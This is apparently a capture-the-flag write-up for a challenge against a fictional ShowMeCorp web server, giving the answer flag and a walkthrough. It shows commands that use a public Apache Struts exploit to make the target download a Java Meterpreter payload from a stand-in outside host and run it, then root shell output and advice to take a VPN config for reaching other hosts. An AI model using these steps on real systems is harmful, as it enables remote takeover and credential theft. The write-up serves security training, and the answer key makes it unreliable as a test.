# Find the Hidden File

## Points 200

It looks like a web developer left their work-in-progress exposed. Find the file that will allow you advance in your exploits against ShowMeCorp.

http://webdev.showmecorp.com:8080/showcase/

(There is a flag.txt file you must retrieve)

(There is another file to retrieve that you will need to progress. This file will contain additional scope information.)

(This target will reset every 60 minutes, at the start of the hour)


## Answer

flag-47685a0173e7b9ff3f513fb33d428e1f

Exploit: https://www.exploit-db.com/exploits/42324/


### Get shell

###Generate a Java Meterpreter payload and handler




### Use exploit to download and run payload

```
$ python struts.py 'http://webdev.showmecorp.com:8080/showcase/integration/saveGangster.action' "wget -O /tmp/bob.jar http://evilserverontheinternet/bob.jar"
$ python struts.py 'http://webdev.showmecorp.com:8080/showcase/integration/saveGangster.action' "java -jar /tmp/bob.jar"
```

### Grab the flag
```
meterpreter > getuid
Server username: root
meterpreter > ls
Listing: /usr/local/tomcat
==========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  19539  fil   2018-09-04 22:30:39 +0000  BUILDING.txt
100666/rw-rw-rw-  6090   fil   2018-09-04 22:30:39 +0000  CONTRIBUTING.md
100666/rw-rw-rw-  57092  fil   2018-09-04 22:30:39 +0000  LICENSE
100666/rw-rw-rw-  1726   fil   2018-09-04 22:30:39 +0000  NOTICE
100666/rw-rw-rw-  3255   fil   2018-09-04 22:30:39 +0000  README.md
100666/rw-rw-rw-  7142   fil   2018-09-04 22:30:39 +0000  RELEASE-NOTES
100666/rw-rw-rw-  16262  fil   2018-09-04 22:30:39 +0000  RUNNING.txt
100666/rw-rw-rw-  8814   fil   2018-09-24 15:47:22 +0000  SusanStone.ovpn
40776/rwxrwxrw-   4096   dir   2018-09-12 20:50:38 +0000  bin
40776/rwxrwxrw-   4096   dir   2018-09-24 16:17:57 +0000  conf
100666/rw-rw-rw-  37     fil   2018-09-24 15:53:16 +0000  flag.txt
40776/rwxrwxrw-   4096   dir   2018-09-12 20:50:37 +0000  include
40776/rwxrwxrw-   4096   dir   2018-09-12 20:50:28 +0000  lib
40776/rwxrwxrw-   4096   dir   2018-10-19 21:02:56 +0000  logs
40776/rwxrwxrw-   4096   dir   2018-09-12 20:50:37 +0000  native-jni-lib
40776/rwxrwxrw-   4096   dir   2018-09-12 20:50:28 +0000  temp
100666/rw-rw-rw-  45015  fil   2018-09-24 19:24:07 +0000  velocity.log
40776/rwxrwxrw-   4096   dir   2018-09-24 16:17:57 +0000  webapps
40776/rwxrwxrw-   4096   dir   2018-09-24 16:17:58 +0000  work

meterpreter > cat flag.txt
flag-47685a0173e7b9ff3f513fb33d428e1f
```

Don't forget to snag `SusanStone.ovpn` it's the only way to get the other hosts.